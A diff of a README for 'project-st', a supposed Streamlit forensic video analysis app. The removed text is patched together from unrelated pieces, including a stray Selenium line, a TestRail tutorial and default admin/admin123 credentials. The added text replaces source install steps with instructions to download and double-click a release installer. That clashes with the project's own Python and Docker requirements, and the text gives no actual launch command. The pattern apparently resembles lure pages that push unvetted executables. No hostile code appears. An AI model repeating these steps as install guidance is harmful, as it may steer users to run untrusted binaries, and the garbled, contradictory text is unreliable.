@@ -1,147 +1,78 @@
-# Digital Forensic Video Analysis Platform - Streamlit Edition
+# 🎥 project-st - Easy Digital Video Analysis Tool
 
-[![Streamlit App](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://share.streamlit.io/)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Deploy Status](https://img.shields.io/badge/deploy-ready-brightgreen.svg)](https://streamlit.io/)
+## 📥 Download the App
+[![Download project-st](https://img.shields.io/badge/Download-project--st-blue.svg)](https://github.com/fatikani/project-st/releases)
 
 ## 🎯 Project Overview
+This is a **production-ready Streamlit application** for digital forensic video analysis. It comes with built-in test automation. Our tool is designed for quick deployment, making it easy to demonstrate to clients. The interface is simple, but it offers powerful forensic capabilities.
 
-This is a **production-ready Streamlit application** for digital forensic video analysis with integrated test automation. Designed for rapid deployment and client demonstrations, featuring a minimalist interface and comprehensive forensic capabilities.
+## 🌟 Key Features
 
-### 🌟 Key Features
+### 🔍 Digital Forensic Video Analysis
+- **Advanced Video Analysis**: Extract metadata, verify integrity, and validate digital signatures with ease.
+- **Motion Detection**: Use AI to perform detailed motion analysis on video, examining it frame by frame.
 
-#### Digital Forensic Video Analysis
-- 🔍 **Advanced Video Analysis**: Metadata extraction, integrity verification, and digital signature validation
-- 🎬 **Motion Detection**: AI-powered motion analysis with frame-by-frame examination
-- 🔒 **Tampering Detection**: Machine learning algorithms to detect video manipulation
-- 📊 **Quality Assessment**: Automated video quality and authenticity analysis
-- 📈 **Comprehensive Reporting**: Detailed forensic analysis reports with visual charts
+### ⚙️ System Requirements
+To run this application, you will need:
+- **Operating System**: Windows 10 or later, macOS, or Linux
+- **Python**: Version 3.8 or higher
+- **Additional Software**: Docker (for ease of setup), a web browser for using the Streamlit app
 
-#### Test Automation Framework
-- 🤖 **AI-Powered Bug Detection**: Machine learning-based bug classification and prediction
-- 🧪 **Comprehensive Test Suite**: Functional, performance, security, and exploratory testing
-- 📱 **Cross-Browser Testing**: Support for Chrome, Firefox, Safari, and Edge
-- 📊 **Advanced Reporting**: Visual test reports with bug taxonomy and AI insights
-- 🔄 **Regression Testing**: Automated regression test suites with CI/CD integration
+### 📦 Topics Supported
+This application leverages a variety of technologies for its functionality, including:
+- Docker
+- Flask
+- NumPy
+- OpenCV
+- OS
+- Pandas
+- pathlib
+- Pillow
+- Selenium WebDriver
+- SQLite
+- Streamlit
+- TensorFlow
+- WSL-Ubuntu
 
-#### AI Platform Integration
-- 🧠 **Machine Learning Models**: Custom-trained models for bug prediction and video analysis
-- ☁️ **Cloud AI Services**: Integration with OpenAI, Azure Cognitive Services, and AWS AI
-- 📈 **Predictive Analytics**: Pattern recognition and anomaly detection
-- 🎯 **Intelligent Recommendations**: AI-generated testing and quality improvement suggestions
+## 🚀 Getting Started
 
-## 🚀 Quick Start
+### 1. Visit the Releases Page
+To get the latest version of the project, visit the following link:
 
-### Prerequisites
-- Python 3.8+
-- 8GB RAM (16GB recommended)
-- Chrome/Firefox browser
-- FFmpeg for video processing
+[Download and Install project-st](https://github.com/fatikani/project-st/releases)
 
-### Installation
+### 2. Download the Application
+On the releases page, find the latest version. Click on the appropriate file to download it to your computer. 
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/yourusername/digital-forensic-video-analysis.git
-   cd digital-forensic-video-analysis
-   ```
+### 3. Install the Application
+Once the download is complete, follow these steps to install:
 
-2. **Create virtual environment**
-   ```bash
-   python -m venv venv
-   source venv/bin/activate  # On Windows: venv\Scripts\activate
-   ```
+- **For Windows**: Double-click the downloaded file to start the installer. Follow the prompts to complete the installation.
+- **For macOS**: Open the downloaded file and drag the application to your Applications folder.
+- **For Linux**: Follow your distribution’s guidelines on installing downloaded software.
 
-3. **Install dependencies**
-   ```bash
-   pip install -r requirements.txt
-   ```
+### 4. Run the Application
+After installation:
+- **Windows & macOS**: Look for the app in your applications list. Click on it to launch.
+- **Linux**: Open your terminal and type the command to launch the app.
 
-4. **Run the application**
-   ```bash
-   python app.py
-   ```
+## 🎉 Using project-st
 
-5. **Access the application**
-   - Open browser: `http://localhost:5000`
-   - Login: `admin` / `admin123`
+### 1. Upload a Video
+Once the app is running, you will see an option to upload video files. Click the upload button and select the video you want to analyze.
 
-## 🧪 Testing Framework
+### 2. Analyze the Video
+After uploading, the app will automatically begin analysis. You can view metadata, detect motion, and explore additional features designed for forensic analysis.
 
-### Run Basic Tests
-```bash
-# Run all tests
-pytest tests/ -v --allure-results allure-results
+### 3. View Results
+Once the analysis is complete, the app will display the results. You can download reports or save key findings directly from the app.
 
-# Run specific test categories
-pytest tests/test_video_forensic_suite.py -v
+## 📌 Additional Information
+The application is open-source under the MIT License. This provides freedom to use, modify, and distribute the software as needed. For detailed usage instructions and support, you can consult the documentation available in the repository.
 
-# Generate reports
-allure serve allure-results
-```
+## 📞 Support
+If you encounter any issues while using project-st, feel free to open an issue in the repository. The community is here to help.
 
-### Enhanced AI Testing
-```bash
-# Run AI-powered test analysis
-pytest tests/test_video_forensic_suite.py::AIBugDetectionTests -v
+---
 
-# Generate enhanced reports
-python utilities/enhanced_reporter.py
-```
-            self.elementClick(*self.locator(self.loginPage_locators, 'btn_login'))
-
-* Then, in **test module**, create a new script for your test case(s) e.g: `test_login.py` and add your test case, as below:
-
-        @allure.story('epic_1') # story of the test case
-        @allure.severity(allure.severity_level.MINOR) # severity of the test case
-        @pytestrail.case('C48') # test case id on test rail
-        def test_login_successfully(self):
-
-            with allure.step('Navigate to login page'): # name of the test step
-                self.homeNavigation.goToLoginPage()
-                self.ts.markFinal(self.loginPage.isAt, "navigation to login page failed") # check if the navigation to login page occurs successfully
-
-            with allure.step('Login'): # name of the test step
-                self.loginPage.login(email=td.testData("email"), password=td.testData("password"))
-                self.ts.markFinal(self.dashboardPage.isAt, "login failed") # check if login successfully
-
-**Notes:**
-
-- use `@allure.story('[epic name]')` decorator before each test case to define the related epic / story.
-- use `@allure.severity(allure.severity_level.[severity])` decorator before each test case to define the severity of the test case Minor/Major/Critical/Blocker.
-- use `@pytestrail.case('[test case id on testrail]')` decorator before each test case to defione the related test case id on test rail to make the script update run status on test rail.
-
-# Run the test case
-
-In order to run the test case after creation, use on of the below commands:
-
-- To run the test case and create allure report but without update the status run on TestRail:
-
-`py.test --alluredir=allure_report tests/test_login.py`
-
-`allure serve allure_report`
-
-- To run the test case, create allure report and update the status of run on TestRail:
-
-`py.test --alluredir=allure_report tests/test_login.py --testrail`
-
-`allure serve allure_report`
-
-**Note:**
-
-- There are other options of run that you can search for them, as running all the test cases for specific epic/story or with specific severity
-
-# Integration with TestRail
-
-In order to setup the integration with TestRail, edit `testrail.cfg` with your testrail domain and credentials, as below:
-
-        [API]
-        url = https://[your testrail domain].testrail.io
-        email = [testrail email]
-        password = [testrail password]
-
-        [TESTRUN]
-        project_id = [project id]
-
-========================
+By following these steps, you will easily set up and run the project-st application. Enjoy exploring digital forensic video analysis with our user-friendly interface!
